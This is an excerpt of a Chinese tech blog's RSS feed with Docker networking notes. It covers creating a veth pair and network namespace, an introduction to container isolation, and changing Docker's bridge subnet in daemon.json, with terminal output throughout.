<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">7:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0@veth0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,M-DOW</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">N&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ee:91:1e:b9:0d:7c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth0@ceth0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,M-DOW</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">N&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7e:c4:14:4d:71:b9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建的这对虚拟网口 veth0 和 ceth0 在根网络命名空间。这对虚拟网口简单来说就是发往 veth0 的数据包会从 ceth0 收到，反之亦然。</p>
<p>接下来我们将 ceth0 放到容器的命名空间中：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth0@if7:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7e:c4:14:4d:71:b9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">K&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">7:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0@if8:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ee:91:1e:b9:0d:7c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到根命名空间少了网口 ceth0 ，容器内多了一个网口 ceth0。</p>
<p>然后我们给 veth0 配上 172.18.0.11/16 地址，给容器内的 ceth0 配上 172.18.0.10/16 地址：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.18.0.11/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.18.0.10/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样主机和容器之间就可以互 ping 了：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.18.0.11</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">PING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.18.0.11</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (172.18.0.11) 56(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">84</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) bytes of data.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.18.0.11:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp_seq=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ttl=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0.186</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.18.0.11:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp_seq=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ttl=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0.089</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.18.0.11:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp_seq=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ttl=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0.086</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">^C</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>把容器变成物理机</title>
      <link>https://www.geekery.cn/note-book/Docker/%E6%8A%8A%E5%AE%B9%E5%99%A8%E5%8F%98%E6%88%90%E7%89%A9%E7%90%86%E6%9C%BA.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E6%8A%8A%E5%AE%B9%E5%99%A8%E5%8F%98%E6%88%90%E7%89%A9%E7%90%86%E6%9C%BA.html</guid>
      <source url="https://www.geekery.cn/rss.xml">把容器变成物理机</source>
      <description>把容器变成物理机 本文的主题是把容器变成物理机，根据所学的知识。以及通过各种搜索引擎。他们都告诉我们，这是不可能的。这真的是不可能的吗？我不信，那我就要创造奇迹。请继续往下看。本文将教你如何把容器变成物理机。 这里只讲硬货，不废话！！！ 什么是容器 img ​ 简单来说，容器是一个隔离的操作系统沙盒，目的是隔离所有操作系统的进程，那么我们也可以称容器的...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>本文的主题是把容器变成物理机，根据所学的知识。以及通过各种搜索引擎。他们都告诉我们，这是不可能的。这真的是不可能的吗？我不信，那我就要创造奇迹。请继续往下看。本文将教你如何把容器变成物理机。</p>
<p>这里只讲硬货，不废话！！！</p>
<h2>什么是容器</h2>
<p></p>
<p>​    简单来说，容器是一个隔离的操作系统沙盒，目的是<a href="https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504" target="_blank" rel="noopener noreferrer">隔离所有操作系统的进程</a>，那么我们也可以称容器的名称为<strong>被隔离的进程</strong>，在不同维度隔离级别有6个。隔离进程的名称空间是内核提供的功能，必须内核支持才可以。也就是说容器的内核跟宿主机的是同一个内核。Docker官方把它称作集装箱，我觉得这非常的形象，他们都工作在Linux 内核这条船上。</p>
<p>既然现在知道容器是个什么了，接下来要了解的是容器的运行逻辑。在用法上，一般把软件包直接放到容器内，然后在容器启动的时候，执行一个命令或者某个脚本文件，熟悉docker的人如果自己动手构建过自己的容器，就会知道CMD命令和ENTRYPOINT这个指令是定义docker的启动之后的执行逻辑。然后docker会安装启动之后的逻辑执行，若这个进程exit了，那么这个容器的运行状态也是exit状态。但是这些对我们本文的主题来讲并不重要。</p>
<p>docker的资源限制是通过cgroup来实现的，但是这也是针对运行状态的容器才会有资源消耗，我们是要转化这个容器，对我们的操作而言并不重要，另外顺便提一嘴，cgroup也是Linux内核的功能。</p>
<p>在空间占用方向上，通常一个容器只需要几MB到数10MB不等，而咱们操作系统都需要G这个单位去计算，这是为什么呢？后面将会说容器与操作系统共享的几个文件和目录，这个是它变小的关键。</p>
<p>Docker的六个维度的隔离</p>
<p>| 内容  | 备注                       | 内核版本 |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>更改docker服务网段分配地址</title>
      <link>https://www.geekery.cn/note-book/Docker/%E6%9B%B4%E6%94%B9docker%E6%9C%8D%E5%8A%A1%E7%BD%91%E6%AE%B5%E5%88%86%E9%85%8D%E5%9C%B0%E5%9D%80.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E6%9B%B4%E6%94%B9docker%E6%9C%8D%E5%8A%A1%E7%BD%91%E6%AE%B5%E5%88%86%E9%85%8D%E5%9C%B0%E5%9D%80.html</guid>
      <source url="https://www.geekery.cn/rss.xml">更改docker服务网段分配地址</source>
      <description>更改docker服务网段分配地址 在docker配置文件中追加参数 更改docker-compose网桥地址 使用单机容器编码工具，docker-compose时，容器之间的通信网络会用到br-xxx网桥，该网桥会在宿主机建立，示例如下： 该网段也有可能与，已有网段重复，若要修改此网段，可按如下步骤进行。安全停掉所有用docker-compose编排的...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>在docker配置文件中追加参数</h2>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"># cat /etc/docker/daemon.json</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "bip"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"172.66.1.1/24"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>更改docker-compose网桥地址</h2>
<p>使用单机容器编码工具，docker-compose时，容器之间的通信网络会用到br-xxx网桥，该网桥会在宿主机建立，示例如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@xingyongsheng ~]# ifconfig | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">headbr-35fc9d6212bd:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flags=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">4163</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">UP,BROADCAST,RUNNING,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt;  </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        inet</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.16.238.1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  netmask</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  broadcast</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.16.238.255</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:42:7a:4f:9a:b9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  txqueuelen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  (Ethernet)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        RX</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> packets</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 6441897</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  bytes</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8754859570</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (8.1 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">GiB</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        RX</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> errors</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  dropped</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  overruns</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  frame</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        TX</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> packets</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1525889</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  bytes</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 953197479</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (909.0 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">MiB</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
